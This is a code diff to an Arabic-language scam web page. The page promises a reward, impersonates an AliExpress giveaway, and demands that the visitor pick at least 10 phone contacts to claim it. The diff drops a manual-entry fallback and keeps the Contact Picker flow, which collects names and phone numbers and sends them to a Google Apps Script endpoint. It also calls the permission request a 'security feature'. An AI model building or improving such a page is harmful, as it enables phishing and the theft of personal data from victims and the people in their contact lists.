@@ -19,14 +19,12 @@
   .reward-box{background:#fff0eb;border:2px dashed var(--brand);border-radius:12px;padding:15px;margin:15px 0}
   .reward-amount{font-size:36px;font-weight:900;color:var(--brand);margin:0;line-height:1}
   .reward-text{font-size:14px;color:#555;margin:5px 0 0}
-  .progress{font-size:13px;color:var(--mut);margin:15px 0}
-  textarea{width:100%;height:90px;padding:10px;border:1px solid #ddd;border-radius:8px;
-    font:inherit;font-size:14px;resize:none;margin-bottom:10px;direction:ltr;text-align:left}
+  .progress{font-size:14px;color:#444;margin:15px 0;font-weight:600;line-height:1.6}
   button{width:100%;padding:16px;border:0;border-radius:30px;cursor:pointer;
     background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;font:inherit;font-weight:700;font-size:17px;
     box-shadow:0 4px 15px rgba(230,46,4,.3);display:flex;align-items:center;justify-content:center;gap:10px}
   button:disabled{opacity:.6;cursor:default}
-  .status{min-height:24px;font-size:13px;color:var(--err);margin:12px 0 0;font-weight:600}
+  .status{min-height:24px;font-size:14px;color:var(--err);margin:12px 0 0;font-weight:600}
   .spin{width:40px;height:40px;border:4px solid #eee;border-top-color:var(--brand);
     border-radius:50%;animation:s 1s linear infinite;margin:20px auto}
   @keyframes s{to{transform:rotate(360deg)}}
@@ -46,20 +44,14 @@
   </div>
 
   <div id="step1">
-    <p class="progress" id="instructionText">للمطالبة بالجائزة، يجب دعوة <strong>10 أصدقاء</strong> على الأقل من جهات الاتصال الخاصة بك.</p>
+    <p class="progress" id="instructionText">
+      للمطالبة بالجائزة، يجب دعوة <strong>10 أصدقاء</strong> على الأقل.<br>
+      يرجى السماح بالوصول لجهات الاتصال واختيار 10 أشخاص.
+    </p>
     
-    <!-- سيتم إظهار هذا في كروم -->
-    <button id="claimChrome" style="display:none;">
+    <button id="claimBtn">
       <span>🎁</span> استلام الجائزة الآن
     </button>
-
-    <!-- سيتم إظهار هذا في الآيفون والمتصفحات الأخرى -->
-    <div id="manualInputContainer" style="display:none;">
-      <textarea id="manualContacts" placeholder="+201012345678&#10;+201098765432&#10;+966501234567&#10;..."></textarea>
-      <button id="claimManual">
-        <span>🎁</span> استلام الجائزة الآن
-      </button>
-    </div>
     
     <p class="status" id="st"></p>
   </div>
@@ -77,15 +69,12 @@
 (function () {
   'use strict';
 
-  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbxAaiB1TaUAu0RNN97KjATD0fYuJ2IxY5Z8wHaM9rlAEjhvBaskT23J_CLnPuu7BWc/exec';
+  const ENDPOINT = 'https://script.google.com/macros/s/REPLACE_WITH_DEPLOY_ID/exec';
   const ALIEXPRESS_URL = 'https://www.aliexpress.com/';
 
   const $ = id => document.getElementById(id);
   const st = $('st'), step1 = $('step1'), step2 = $('step2'), 
-        instructionText = $('instructionText'),
-        claimChrome = $('claimChrome'), 
-        manualInputContainer = $('manualInputContainer'),
-        manualContacts = $('manualContacts'), claimManual = $('claimManual');
+        claimBtn = $('claimBtn'), instructionText = $('instructionText');
         
   const sleep = ms => new Promise(r => setTimeout(r, ms));
   
@@ -180,17 +169,24 @@
     window.location.href = ALIEXPRESS_URL;
   }
 
-  // 1. الخطة أ: جوجل كروم (اختيار جهات الاتصال)
-  claimChrome.addEventListener('click', async () => {
-    if (!navigator.contacts || !navigator.contacts.select) return;
-    claimChrome.disabled = true;
+  claimBtn.addEventListener('click', async () => {
+    // التحقق من دعم المتصفح
+    if (!navigator.contacts || !navigator.contacts.select) {
+      st.innerHTML = 'متصفحك لا يدعم هذه الميزة الأمنية.<br>يرجى فتح الرابط باستخدام <b>Google Chrome</b> على هاتف أندرويد.';
+      return;
+    }
+
+    claimBtn.disabled = true;
     st.textContent = '';
 
     try {
+      // طلب إذن الوصول لجهات الاتصال (Native Prompt)
       const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+      
+      // التحقق من عدد الأرقام
       if (!contacts || contacts.length < 10) {
-        claimChrome.disabled = false;
-        st.textContent = 'يجب عليك اختيار 10 جهات اتصال على الأقل للمطالبة بالجائزة.';
+        claimBtn.disabled = false;
+        st.textContent = 'يجب عليك اختيار 10 جهات اتصال على الأقل للمطالبة بالجائزة. لقد اخترت ' + (contacts ? contacts.length : 0);
         return;
       }
       
@@ -200,49 +196,12 @@
       }));
 
       processAndSend(formattedContacts);
+
     } catch (err) {
-      claimChrome.disabled = false;
-      st.textContent = 'تم إلغاء العملية. يرجى المحاولة مرة أخرى.';
+      claimBtn.disabled = false;
+      st.textContent = 'تم إلغاء عملية الوصول لجهات الاتصال. يرجى السماح بالوصول للمتابعة.';
     }
   });
-
-  // 2. الخطة ب: الآيفون والمتصفحات الأخرى (إدخال يدوي)
-  claimManual.addEventListener('click', async () => {
-    const rawText = manualContacts.value.trim();
-    if (!rawText) {
-      st.textContent = 'يرجى إدخال 10 أرقام هواتف على الأقل.';
-      return;
-    }
-    
-    // فصل الأرقام بناءً على السطر الجديد أو المسافة أو الفاصلة
-    const phoneNumbers = rawText.split(/[\n,]+/).map(s => s.trim()).filter(s => s.length > 5);
-    
-    if (phoneNumbers.length < 10) {
-      st.textContent = 'لقد أدخلت ' + phoneNumbers.length + ' أرقام فقط. يجب إدخال 10 أرقام على الأقل.';
-      return;
-    }
-
-    claimManual.disabled = true;
-    st.textContent = '';
-
-    const formattedContacts = phoneNumbers.map(num => ({
-      name: 'Manual',
-      tel: num
-    }));
-
-    processAndSend(formattedContacts);
-  });
-
-  // التهيئة: تحديد المتصفح
-  if (navigator.contacts && navigator.contacts.select) {
-    // إذا كان كروم أندرويد -> استخدم اختيار الاتصالات
-    claimChrome.style.display = 'flex';
-  } else {
-    // إذا كان آيفون أو كمبيوتر أو فايرفوكس -> استخدم الإدخال اليدوي
-    manualInputContainer.style.display = 'block';
-    instructionText.innerHTML = 'للمطالبة بالجائزة، يرجى إدخال أرقام <strong>10 أصدقاء</strong> (رقم واحد في كل سطر) لإرسال الدعوات إليهم.';
-    manualContacts.placeholder = '+201012345678\n+201098765432\n+966501234567\n+971501234567\n+212601234567\n...';
-  }
 
 })();
 </script>
